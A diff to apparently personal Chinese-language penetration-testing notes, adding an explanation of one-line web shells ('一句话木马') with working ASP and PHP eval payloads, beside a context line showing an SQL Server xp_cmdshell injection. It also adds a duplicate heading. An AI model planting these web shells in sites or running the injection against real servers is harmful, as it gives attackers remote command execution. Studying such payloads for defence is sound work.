@@ -194,8 +194,18 @@ exec master.dbo.xp_cmdshell username;--
 
 > 端口转发
 >
+> 一句话木马是什么
+>
+> ​		 最直白的形式：把<%execute(request("value"))%>插入	到网页里。
+>
 > 一句话木马能干嘛
 >
+> ​	- 似乎是执行远程的value值，这个值是命令
+>
 > 一句话木马怎么写
+>
+> ​	- <%execute(request("value"))%>， <?php @eval($_POST[value]);?>
+
+#### sqlserver差异备份、完全备份、权限入侵
 
 #### sqlserver差异备份、完全备份、权限入侵
